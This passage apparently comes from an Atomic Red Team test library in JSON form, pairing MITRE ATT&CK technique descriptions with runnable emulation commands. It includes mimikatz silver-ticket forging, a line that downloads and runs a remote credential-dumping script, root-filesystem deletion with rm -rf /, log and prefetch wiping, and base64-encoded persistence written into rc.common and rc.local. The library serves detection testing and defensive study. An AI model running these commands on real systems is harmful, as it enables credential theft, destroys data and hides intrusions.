-ErrorAction Ignore\nRemove-Item $env:TEMP\\silver.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"#{domain_sid}\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to silver.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\silver.txt 2>&1 (\n  echo Purge existing tickets and create silver ticket:\n  klist purge\n  #{mimikatz_path} \"kerberos::golden /domain:#{domain} /sid:DOMAIN_SID /aes256:#{service_aes256_key} /user:#{account} /service:HOST /target:#{target}.#{domain} /ptt\" \"exit\"\n\n  echo.\n  echo executing:schtasks /query /S #{target}.#{domain}\n  schtasks /query /S #{target}.#{domain}\n  \n  echo.\n  echo Tickets after requesting schtasks:\n  klist\n\n  echo.\n  echo End of Silver Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\silver.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\silver.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\silver.txt\" -Wait | ForEach-Object {\n    if ($_ -match 'End of Silver Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\silver.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\silver.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\silver.txt -ErrorAction Ignore\n"}}]}, "T1555.004": {"name": "Windows Credential Manager", "technique_id": "attack-pattern--d336b553-5da9-46ca-98a8-0b23f49fb447", "external_id": "T1555.004", "data_components": ["Command Execution", "File Access", "OS API Execution", "Process Creation"], "kill_chain_phases": ["credential-access"], "data_source_platforms": [], "mitigations": ["course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may acquire credentials from the Windows Credential Manager. The Credential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos in Credential Lockers (previously known as Windows Vaults).(Citation: Microsoft Credential Manager store)(Citation: Microsoft Credential Locker)\n\nThe Windows Credential Manager separates website credentials from application or network credentials in two lockers. As part of [Credentials from Web Browsers](https://attack.mitre.org/techniques/T1555/003), Internet Explorer and Microsoft Edge website credentials are managed by the Credential Manager and are stored in the Web Credentials locker. Application and network credentials are stored in the Windows Credentials locker.\n\nCredential Lockers store credentials in encrypted `.vcrd` files, located under `%Systemdrive%\\Users\\\\[Username]\\AppData\\Local\\Microsoft\\\\[Vault/Credentials]\\`. The encryption key can be found in a file named <code>Policy.vpol</code>, typically located in the same folder as the credentials.(Citation: passcape Windows Vault)(Citation: Malwarebytes The Windows Vault)\n\nAdversaries may list credentials managed by the Windows Credential Manager through several mechanisms. <code>vaultcmd.exe</code> is a native Windows executable that can be used to enumerate credentials stored in the Credential Locker through a command-line interface. Adversaries may also gather credentials by directly reading files located inside of the Credential Lockers. Windows APIs, such as <code>CredEnumerateA</code>, may also be absued to list credentials managed by the Credential Manager.(Citation: Microsoft CredEnumerate)(Citation: Delpy Mimikatz Crendential Manager)\n\nAdversaries may also obtain credentials from credential backups. Credential backups and restorations may be performed by running <code>rundll32.exe keymgr.dll KRShowKeyMgr</code> then selecting the \u201cBack up...\u201d button on the \u201cStored User Names and Passwords\u201d GUI.\n\nPassword recovery tools may also obtain plain text passwords from the Credential Manager.(Citation: Malwarebytes The Windows Vault)", "atomic_tests": [{"name": "Access Saved Credentials via VaultCmd", "auto_generated_guid": "9c2dd36d-5c8b-4b29-8d72-a11b0d5d7439", "description": "List credentials currently stored in Windows Credential Manager via the native Windows utility vaultcmd.exe\nCredential Manager stores credentials for signing into websites, applications, and/or devices that request authentication through NTLM or Kerberos\nhttps://blog.malwarebytes.com/101/2016/01/the-windows-vaults/\nhttps://medium.com/threatpunter/detecting-adversary-tradecraft-with-image-load-event-logging-and-eql-8de93338c16\n", "supported_platforms": ["windows"], "executor": {"name": "command_prompt", "elevation_required": false, "command": "vaultcmd /listcreds:\"Windows Credentials\"\n"}}, {"name": "WinPwn - Loot local Credentials - Invoke-WCMDump", "auto_generated_guid": "fa714db1-63dd-479e-a58e-7b2b52ca5997", "description": "Loot local Credentials - Invoke-WCMDump technique via function of WinPwn", "supported_platforms": ["windows"], "executor": {"command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')\nInvoke-WCMDump", "name": "powershell"}}]}, "T1485": {"name": "Data Destruction", "technique_id": "attack-pattern--d45a3d09-b3cf-48f4-9f0f-f521ee5cb05c", "external_id": "T1485", "data_components": ["File Modification", "Image Deletion", "Process Creation", "File Deletion", "Command Execution", "Instance Deletion", "Snapshot Deletion", "Volume Deletion", "Cloud Storage Deletion"], "kill_chain_phases": ["impact"], "data_source_platforms": [], "mitigations": ["course-of-action--3efe43d1-6f3f-4fcb-ab39-4a730971f70b"], "description": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk's logical structure.\n\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)\n\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018).\n\nIn cloud environments, adversaries may leverage access to delete cloud storage, cloud storage accounts, machine images, and other infrastructure crucial to operations to damage an organization or their customers.(Citation: Data Destruction - Threat Post)(Citation: DOJ  - Cisco Insider)", "atomic_tests": [{"name": "Windows - Overwrite file with SysInternals SDelete", "auto_generated_guid": "476419b5-aebf-4366-a131-ae3e8dae5fc2", "description": "Overwrites and deletes a file using SysInternals SDelete. Upon successful execution, \"Files deleted: 1\" will be displayed in\nthe powershell session along with other information about the file that was deleted.\n", "supported_platforms": ["windows"], "input_arguments": {"sdelete_exe": {"description": "Path of sdelete executable", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\Sdelete\\sdelete.exe"}, "file_to_delete": {"description": "Path of file to delete", "type": "path", "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1485.txt"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "Secure delete tool from SysInternals must exist on disk at specified location (#{sdelete_exe})\n", "prereq_command": "if (Test-Path \"#{sdelete_exe}\") {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/SDelete.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\SDelete.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\SDelete.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\Sdelete\" -Force\nRemove-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\SDelete.zip\" -Force\n"}], "executor": {"command": "if (-not (Test-Path \"#{file_to_delete}\")) { New-Item \"#{file_to_delete}\" -Force }\n& \"#{sdelete_exe}\" -accepteula \"#{file_to_delete}\"\n", "name": "powershell"}}, {"name": "FreeBSD/macOS/Linux - Overwrite file with DD", "auto_generated_guid": "38deee99-fd65-4031-bec8-bfa4f9f26146", "description": "Overwrites and deletes a file using DD.\nTo stop the test, break the command with CTRL/CMD+C.\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"overwrite_source": {"description": "Path of data source to overwrite with", "type": "path", "default": "/dev/zero"}, "file_to_overwrite": {"description": "Path of file to overwrite and remove", "type": "path", "default": "/var/log/syslog"}}, "executor": {"command": "dd of=#{file_to_overwrite} if=#{overwrite_source} count=$(ls -l #{file_to_overwrite} | awk '{print $5}') iflag=count_bytes\n", "name": "sh"}}, {"name": "Overwrite deleted data on C drive", "auto_generated_guid": "321fd25e-0007-417f-adec-33232252be19", "description": "RansomEXX malware removes all deleted files using windows built-in cipher.exe to prevent forensic recover.\nThis process is very slow and test execution may timeout. \nhttps://www.cybereason.com/blog/cybereason-vs.-ransomexx-ransomware\nhttps://support.microsoft.com/en-us/topic/cipher-exe-security-tool-for-the-encrypting-file-system-56c85edd-85cf-ac07-f2f7-ca2d35dab7e4\n", "supported_platforms": ["windows"], "executor": {"command": "cipher.exe /w:C:\n", "name": "command_prompt"}}, {"name": "GCP - Delete Bucket", "auto_generated_guid": "4ac71389-40f4-448a-b73f-754346b3f928", "description": "This Atomic will create a Google Storage Bucket then delete it. The idea for this Atomic came from a Rule published by the Elastic team.\n\nIdentifies when a Google Cloud Platform (GCP) storage bucket is deleted. An adversary may delete a storage bucket in order to disrupt their target's business operations.\nThis atomic will create a bucket then delete the bucket.\n\nReference: https://github.com/elastic/detection-rules/blob/main/rules/integrations/gcp/impact_gcp_storage_bucket_deleted.toml\n", "supported_platforms": ["iaas:gcp"], "input_arguments": {"project_id": {"description": "ID of the GCP Project you to execute the command against.", "type": "string", "default": "atomic-test-1"}, "bucket_name": {"description": "The name of the bucket to delete.", "type": "string", "default": "atomic-red-team-bucket"}}, "executor": {"name": "sh", "elevation_required": false, "command": "gcloud config set project #{project_id}\ngcloud storage buckets delete gs://#{bucket_name}\n", "cleanup_command": "cd \"$PathToAtomicsFolder/T1485/src/T1485-4/\"\nterraform state rm google_storage_bucket.bucket\nterraform destroy -auto-approve\n"}, "dependency_executor_name": "sh", "dependencies": [{"description": "Requires gcloud\n", "prereq_command": "if [ -x \"$(command -v gcloud)\" ]; then exit 0; else exit 1; fi;\n", "get_prereq_command": "echo \"Please Install Google Cloud SDK before running this atomic test : https://cloud.google.com/sdk/docs/install\"\n"}, {"description": "Check if user is logged in \n", "prereq_command": "gcloud config get-value account\n", "get_prereq_command": "gcloud auth login --no-launch-browser\n"}, {"description": "Check if terraform is installed.\n", "prereq_command": "terraform version\n", "get_prereq_command": "echo Please install the terraform.\n"}, {"description": "Create dependency resources using terraform\n", "prereq_command": "stat \"$PathToAtomicsFolder/T1485/src/T1485-4/terraform.tfstate\"\n", "get_prereq_command": "cd \"$PathToAtomicsFolder/T1485/src/T1485-4/\"\nterraform init\nterraform apply -auto-approve"}]}]}, "T1027.006": {"name": "HTML Smuggling", "technique_id": "attack-pattern--d4dc46e3-5ba5-45b9-8204-010867cacfcb", "external_id": "T1027.006", "data_components": ["File Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may smuggle data and files past content filters by hiding malicious payloads inside of seemingly benign HTML files. HTML documents can store large binary objects known as JavaScript Blobs (immutable data that represents raw bytes) that can later be constructed into file-like objects. Data may also be stored in Data URLs, which enable embedding media type or MIME files inline of HTML documents. HTML5 also introduced a download attribute that may be used to initiate file downloads.(Citation: HTML Smuggling Menlo Security 2020)(Citation: Outlflank HTML Smuggling 2018)\n\nAdversaries may deliver payloads to victims that bypass security controls through HTML Smuggling by abusing JavaScript Blobs and/or HTML5 download attributes. Security controls such as web content filters may not identify smuggled malicious files inside of HTML/JS files, as the content may be based on typically benign MIME types such as <code>text/plain</code> and/or <code>text/html</code>. Malicious files or data can be obfuscated and hidden inside of HTML files through Data URLs and/or JavaScript Blobs and can be deobfuscated when they reach the victim (i.e. [Deobfuscate/Decode Files or Information](https://attack.mitre.org/techniques/T1140)), potentially bypassing content filters.\n\nFor example, JavaScript Blobs can be abused to dynamically generate malicious files in the victim machine and may be dropped to disk by abusing JavaScript functions such as <code>msSaveBlob</code>.(Citation: HTML Smuggling Menlo Security 2020)(Citation: MSTIC NOBELIUM May 2021)(Citation: Outlflank HTML Smuggling 2018)(Citation: nccgroup Smuggling HTA 2017)", "atomic_tests": [{"name": "HTML Smuggling Remote Payload", "auto_generated_guid": "30cbeda4-08d9-42f1-8685-197fad677734", "description": "The HTML file will download an ISO file from [T1553.005](https://github.com/redcanaryco/atomic-red-team/blob/d0dad62dbcae9c60c519368e82c196a3db577055/atomics/T1553.005/bin/FeelTheBurn.iso) without user interaction. \nThe HTML file is based off of the work from [Stan Hegt](https://outflank.nl/blog/2018/08/14/html-smuggling-explained/)\n", "supported_platforms": ["windows"], "dependencies": [{"description": "T1027_006_remote.html must exist on disk at specified at PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html\n", "prereq_command": "if (Test-Path \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html\") { exit 0} else { exit 1}\n", "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\T1027.006\\bin\\\" -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027.006/bin/T1027_006_Remote.html\" -OutFile \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_Remote.html\"\n"}], "executor": {"command": "& \"PathToAtomicsFolder\\T1027.006\\bin\\T1027_006_remote.html\"\n", "cleanup_command": "$user = [System.Environment]::UserName; Remove-Item -Path C:\\Users\\$user\\Downloads\\FeelTheBurn.iso -ErrorAction Ignore", "name": "powershell", "elevation_required": false}}]}, "T1070.004": {"name": "File Deletion", "technique_id": "attack-pattern--d63a3fb8-9452-4e9d-a60a-54be68d5998c", "external_id": "T1070.004", "data_components": ["Command Execution", "File Deletion"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": null, "description": "Adversaries may delete files left behind by the actions of their intrusion activity. Malware, tools, or other non-native files dropped or created on a system by an adversary (ex: [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) may leave traces to indicate to what was done within a network and how. Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint.\n\nThere are tools available from the host operating system to perform cleanup, but adversaries may use other tools as well.(Citation: Microsoft SDelete July 2016) Examples of built-in [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059) functions include <code>del</code> on Windows and <code>rm</code> or <code>unlink</code> on Linux and macOS.", "atomic_tests": [{"name": "Delete a single file - FreeBSD/Linux/macOS", "auto_generated_guid": "562d737f-2fc6-4b09-8c2a-7f8ff0828480", "description": "Delete a single file from the temporary directory\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"parent_folder": {"description": "Path of parent folder", "type": "path", "default": "/tmp/victim-files/"}, "file_to_delete": {"description": "Path of file to delete", "type": "path", "default": "/tmp/victim-files/T1070.004-test.txt"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "The file must exist in order to be deleted\n", "prereq_command": "test -e #{file_to_delete} && exit 0 || exit 1\n", "get_prereq_command": "mkdir -p #{parent_folder} && touch #{file_to_delete}\n"}], "executor": {"command": "rm -f #{file_to_delete}\n", "cleanup_command": "rm -rf #{parent_folder}\n", "name": "sh"}}, {"name": "Delete an entire folder - FreeBSD/Linux/macOS", "auto_generated_guid": "a415f17e-ce8d-4ce2-a8b4-83b674e7017e", "description": "Recursively delete the temporary directory and all files contained within it\n", "supported_platforms": ["linux", "macos"], "input_arguments": {"folder_to_delete": {"description": "Path of folder to delete", "type": "path", "default": "/tmp/victim-folder"}}, "dependency_executor_name": "sh", "dependencies": [{"description": "The folder must exist in order to be deleted\n", "prereq_command": "test -e #{folder_to_delete} && exit 0 || exit 1\n", "get_prereq_command": "mkdir -p #{folder_to_delete}\n"}], "executor": {"command": "rm -rf #{folder_to_delete}\n", "name": "sh"}}, {"name": "Overwrite and delete a file with shred", "auto_generated_guid": "039b4b10-2900-404b-b67f-4b6d49aa6499", "description": "Use the `shred` command to overwrite the temporary file and then delete it\n", "supported_platforms": ["linux"], "input_arguments": {"file_to_shred": {"description": "Path of file to shred", "type": "path", "default": "/tmp/victim-shred.txt"}}, "executor": {"command": "shred -u #{file_to_shred}\n", "name": "sh"}}, {"name": "Delete a single file - Windows cmd", "auto_generated_guid": "861ea0b4-708a-4d17-848d-186c9c7f17e3", "description": "Delete a single file from the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n", "supported_platforms": ["windows"], "input_arguments": {"file_to_delete": {"description": "File to delete. Run the prereq command to create it if it does not exist.", "type": "string", "default": "%temp%\\deleteme_T1551.004"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "The file to delete must exist on disk at specified location (#{file_to_delete})\n", "prereq_command": "IF EXIST \"#{file_to_delete}\" ( EXIT 0 ) ELSE ( EXIT 1 )\n", "get_prereq_command": "echo deleteme_T1551.004 >> #{file_to_delete}\n"}], "executor": {"command": "del /f #{file_to_delete}\n", "name": "command_prompt"}}, {"name": "Delete an entire folder - Windows cmd", "auto_generated_guid": "ded937c4-2add-42f7-9c2c-c742b7a98698", "description": "Recursively delete a folder in the temporary directory using cmd.exe.\nUpon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n", "supported_platforms": ["windows"], "input_arguments": {"folder_to_delete": {"description": "Folder to delete. Run the prereq command to create it if it does not exist.", "type": "string", "default": "%temp%\\deleteme_T1551.004"}}, "dependency_executor_name": "command_prompt", "dependencies": [{"description": "The file to delete must exist on disk at specified location (#{folder_to_delete})\n", "prereq_command": "IF EXIST \"#{folder_to_delete}\" ( EXIT 0 ) ELSE ( EXIT 1 )\n", "get_prereq_command": "mkdir #{folder_to_delete}\n"}], "executor": {"command": "rmdir /s /q #{folder_to_delete}\n", "name": "command_prompt"}}, {"name": "Delete a single file - Windows PowerShell", "auto_generated_guid": "9dee89bd-9a98-4c4f-9e2d-4256690b0e72", "description": "Delete a single file from the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the file was deleted.\n", "supported_platforms": ["windows"], "input_arguments": {"file_to_delete": {"description": "File to delete. Run the prereq command to create it if it does not exist.", "type": "string", "default": "$env:TEMP\\deleteme_T1551.004"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The file to delete must exist on disk at specified location (#{file_to_delete})\n", "prereq_command": "if (Test-Path #{file_to_delete}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Path #{file_to_delete} | Out-Null\n"}], "executor": {"command": "Remove-Item -path #{file_to_delete}\n", "name": "powershell"}}, {"name": "Delete an entire folder - Windows PowerShell", "auto_generated_guid": "edd779e4-a509-4cba-8dfa-a112543dbfb1", "description": "Recursively delete a folder in the temporary directory using Powershell. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n", "supported_platforms": ["windows"], "input_arguments": {"folder_to_delete": {"description": "Folder to delete. Run the prereq command to create it if it does not exist.", "type": "string", "default": "$env:TEMP\\deleteme_folder_T1551.004"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "The folder to delete must exist on disk at specified location (#{folder_to_delete})\n", "prereq_command": "if (Test-Path #{folder_to_delete}) {exit 0} else {exit 1}\n", "get_prereq_command": "New-Item -Path #{folder_to_delete} -Type Directory | Out-Null\n"}], "executor": {"command": "Remove-Item -Path #{folder_to_delete} -Recurse\n", "name": "powershell"}}, {"name": "Delete Filesystem - Linux", "auto_generated_guid": "f3aa95fe-4f10-4485-ad26-abf22a764c52", "description": "This test deletes the entire root filesystem of a Linux system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.\n", "supported_platforms": ["linux"], "executor": {"command": "rm -rf / --no-preserve-root > /dev/null 2> /dev/null\n", "name": "bash"}}, {"name": "Delete Filesystem - FreeBSD", "auto_generated_guid": "b5aaca7e-a48f-4f1b-8f0f-a27b8f516608", "description": "This test deletes the entire root filesystem of a FreeBSD system. This technique was used by Amnesia IoT malware to avoid analysis. This test is dangerous and destructive, do NOT use on production equipment.\n", "supported_platforms": ["linux"], "executor": {"command": "chflags -R 0 /\nrm -rf / > /dev/null 2> /dev/null\n", "name": "sh"}}, {"name": "Delete Prefetch File", "auto_generated_guid": "36f96049-0ad7-4a5f-8418-460acaeb92fb", "description": "Delete a single prefetch file.  Deletion of prefetch files is a known anti-forensic technique. To verify execution, Run \"(Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" | Measure-Object).Count\"\nbefore and after the test to verify that the number of prefetch files decreases by 1.\n", "supported_platforms": ["windows"], "executor": {"command": "Remove-Item -Path (Join-Path \"$Env:SystemRoot\\prefetch\\\" (Get-ChildItem -Path \"$Env:SystemRoot\\prefetch\\*.pf\" -Name)[0])\n", "name": "powershell", "elevation_required": true}}, {"name": "Delete TeamViewer Log Files", "auto_generated_guid": "69f50a5f-967c-4327-a5bb-e1a9a9983785", "description": "Adversaries may delete TeamViewer log files to hide activity. This should provide a high true-positive alert ration.\nThis test just places the files in a non-TeamViewer folder, a detection would just check for a deletion event matching the TeamViewer\nlog file format of TeamViewer_##.log. Upon execution, no output will be displayed. Use File Explorer to verify the folder was deleted.\n\nhttps://twitter.com/SBousseaden/status/1197524463304290305?s=20\n", "supported_platforms": ["windows"], "input_arguments": {"teamviewer_log_file": {"description": "Teamviewer log file to create and delete.", "type": "string", "default": "$env:TEMP\\TeamViewer_54.log"}}, "executor": {"command": "New-Item -Path #{teamviewer_log_file} -Force | Out-Null\nRemove-Item #{teamviewer_log_file} -Force -ErrorAction Ignore\n", "name": "powershell"}}]}, "T1221": {"name": "Template Injection", "technique_id": "attack-pattern--dc31fe1e-d722-49da-8f5f-92c7b5aff534", "external_id": "T1221", "data_components": ["Network Connection Creation", "Network Traffic Content", "Process Creation"], "kill_chain_phases": ["defense-evasion"], "data_source_platforms": [], "mitigations": ["course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c", "course-of-action--2a4f6c11-a4a7-4cb9-b0ef-6ae1bb3a718a", "course-of-action--a6a47a06-08fc-4ec4-bdc3-20373375ebb9", "course-of-action--eb88d97c-32f1-40be-80f0-d61a4b0b4b31"], "description": "Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsoft\u2019s Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.(Citation: Microsoft Open XML July 2017)\n\nProperties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.\n\nAdversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.(Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.(Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.(Citation: MalwareBytes Template Injection OCT 2017)\n\nAdversaries may also modify the <code>*\\template</code> control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.(Citation: Proofpoint RTF Injection)(Citation: Ciberseguridad Decoding malicious RTF files)\n\nThis technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.(Citation: Anomali Template Injection MAR 2018)(Citation: Talos Template Injection July 2017)(Citation: ryhanson phishery SEPT 2016)", "atomic_tests": [{"name": "WINWORD Remote Template Injection", "auto_generated_guid": "1489e08a-82c7-44ee-b769-51b72d03521d", "description": "Open a .docx file that loads a remote .dotm macro enabled template from https://github.com/redcanaryco/atomic-red-team/tree/master/atomics/T1221/src/opencalc.dotm \nExecutes the code specified within the .dotm template.\nRequires download of WINWORD found in Microsoft Ofiice at Microsoft: https://www.microsoft.com/en-us/download/office.aspx.  \nDefault docs file opens Calculator.exe when test sucessfully executed, while AV turned off.\n", "supported_platforms": ["windows"], "input_arguments": {"docx_file": {"description": "Location of the test docx file on the local filesystem.", "type": "path", "default": "PathToAtomicsFolder\\T1221\\src\\Calculator.docx"}}, "dependency_executor_name": "powershell", "dependencies": [{"description": "", "prereq_command": "", "get_prereq_command": ""}], "executor": {"command": "start \"#{docx_file}\"\n", "name": "command_prompt"}}]}, "T1037.004": {"name": "RC Scripts", "technique_id": "attack-pattern--dca670cf-eeec-438f-8185-fd959d9ef211", "external_id": "T1037.004", "data_components": ["File Modification", "Process Creation", "Command Execution", "File Creation"], "kill_chain_phases": ["persistence", "privilege-escalation"], "data_source_platforms": [], "mitigations": ["course-of-action--987988f0-cf86-4680-a875-2f6456ab2448"], "description": "Adversaries may establish persistence by modifying RC scripts which are executed during a Unix-like system\u2019s startup. These files allow system administrators to map and start custom services at startup for different run levels. RC scripts require root privileges to modify.\n\nAdversaries can establish persistence by adding a malicious binary path or shell commands to <code>rc.local</code>, <code>rc.common</code>, and other RC scripts specific to the Unix-like distribution.(Citation: IranThreats Kittens Dec 2017)(Citation: Intezer HiddenWasp Map 2019) Upon reboot, the system executes the script's contents as root, resulting in persistence.\n\nAdversary abuse of RC scripts is especially effective for lightweight Unix-like distributions using the root user as default, such as IoT or embedded systems.(Citation: intezer-kaiji-malware)\n\nSeveral Unix-like systems have moved to Systemd and deprecated the use of RC scripts. This is now a deprecated mechanism in macOS in favor of [Launchd](https://attack.mitre.org/techniques/T1053/004). (Citation: Apple Developer Doco Archive Launchd)(Citation: Startup Items) This technique can be used on Mac OS X Panther v10.3 and earlier versions which still execute the RC scripts.(Citation: Methods of Mac Malware Persistence) To maintain backwards compatibility some systems, such as Ubuntu, will execute the RC scripts if they exist with the correct file permissions.(Citation: Ubuntu Manpage systemd rc)", "atomic_tests": [{"name": "rc.common", "auto_generated_guid": "97a48daa-8bca-4bc0-b1a9-c1d163e762de", "description": "Modify rc.common\n\n[Reference](https://developer.apple.com/library/content/documentation/MacOSX/Conceptual/BPSystemStartup/Chapters/StartupItems.html)\n", "supported_platforms": ["macos"], "executor": {"command": "sudo echo osascript -e 'tell app \"Finder\" to display dialog \"Hello World\"' >> /etc/rc.common\n", "elevation_required": true, "name": "bash"}}, {"name": "rc.common", "auto_generated_guid": "c33f3d80-5f04-419b-a13a-854d1cbdbf3a", "description": "Modify rc.common\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "elevation_required": true, "command": "filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi\nprintf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.common\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMuY29tbW9uID4gL3RtcC9UMTAzNy4wMDQucmMuY29tbW9uJykK'))\\\"\" | sudo tee -a /etc/rc.common\nprintf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.common\nsudo chmod +x /etc/rc.common\n", "cleanup_command": "origfilename='/etc/rc.common.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.common;else sudo cp $origfilename /etc/rc.common && sudo rm $origfilename;fi\n"}}, {"name": "rc.local", "auto_generated_guid": "126f71af-e1c9-405c-94ef-26a47b16c102", "description": "Modify rc.local\n", "supported_platforms": ["linux"], "executor": {"name": "bash", "elevation_required": true, "command": "filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi\nprintf '%s\\n' '#!/bin/bash' | sudo tee /etc/rc.local\necho \"python3 -c \\\"import os, base64;exec(base64.b64decode('aW1wb3J0IG9zCm9zLnBvcGVuKCdlY2hvIGF0b21pYyB0ZXN0IGZvciBtb2RpZnlpbmcgcmMubG9jYWwgPiAvdG1wL1QxMDM3LjAwNC5yYy5sb2NhbCcpCgo='))\\\"\" | sudo tee -a /etc/rc.local\nprintf '%s\\n' 'exit 0' | sudo tee -a /etc/rc.local\nsudo chmod +x /etc/rc.local\n", "cleanup_command": "origfilename='/etc/rc.local.original';if [ ! -f $origfilename ];then sudo rm /etc/rc.local;else sudo cp 